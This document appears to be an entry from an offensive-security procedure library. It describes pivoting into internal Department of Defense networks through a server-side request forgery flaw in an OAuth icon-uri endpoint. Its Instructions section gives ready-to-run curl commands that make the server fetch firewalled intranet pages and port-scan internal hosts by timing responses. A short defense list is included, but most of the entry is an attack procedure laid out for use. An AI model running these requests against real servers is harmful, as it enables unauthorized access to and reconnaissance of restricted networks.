---
tags:
  - dod
  - internal-pivot
  - firewall-bypass
  - port-scan
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
commands:
  - '[[commands/curl-ssrf-internal-dod-site]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T04:08:55.303Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: 191ef79d-446a-40b4-b177-b00a30c60cad
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Pivot-to-Internal-DoD-Networks-via-SSRF

## Summary

This procedure leverages SSRF to tunnel requests to internal DoD networks, bypassing firewalls, accessing intranet sites, and performing port scanning via response times (XSPA technique).

## Description

From the SSRF foothold, attackers proxy HTTPS requests to DoD-only URLs, ignoring external SSL issues and firewalled access. In the reported incident, this exposed military servers and resources. Requires SSRF confirmation; outcomes include intranet content retrieval and service discovery.

## Requirements

1. Active SSRF via OAuth endpoint
2. Knowledge of internal DoD URLs (e.g., from OSINT or prior recon)
3. Timing tools for port scanning
4. Handle redacted/internal endpoints carefully

## Defense

Defensive measures and detection strategies:

- Firewall rules to block app server outbound to internal nets
- SSL pinning and certificate validation on internals
- Monitor response times and anomalous internal fetches
- Segment DoD networks from cloud instances
- Implement application-level request logging

## Objectives

1. Access restricted internal resources
2. Bypass network controls and SSL validation
3. Enumerate services for further exploitation

## Instructions

### Step 1: Tunnel to Internal DoD Sites

**Context**: Force the server to fetch content from firewalled DoD URLs, retrieving intranet pages.

**Command** ([[commands/curl-ssrf-internal-dod-site]]):
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=https://internal-dod-site.example/" -v
```

> Returns internal site content; repeat for multiple redacted URLs like https://www.dod-internal/ or https://protected-dod-server/safe/.

### Step 2: Port Scanning via Response Times

**Context**: Use SSRF to probe localhost or internal hosts on various ports, differentiating open/closed based on fetch times.

**Command** ([[commands/curl-ssrf-internal-dod-site]] variation with timing):
```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://localhost:22/" -w "%{time_total}\n" -s
```

> Run for ports 22, 80, 443, etc.; open ports yield faster responses. Expected: Time differences indicating open services.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery
- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery (adapted for port enum)

### Sub-Techniques

-

## Commands Used

- [[commands/curl-ssrf-internal-dod-site]]

## Tools Used

-

## Tags

- dod
- pivot
- xspa
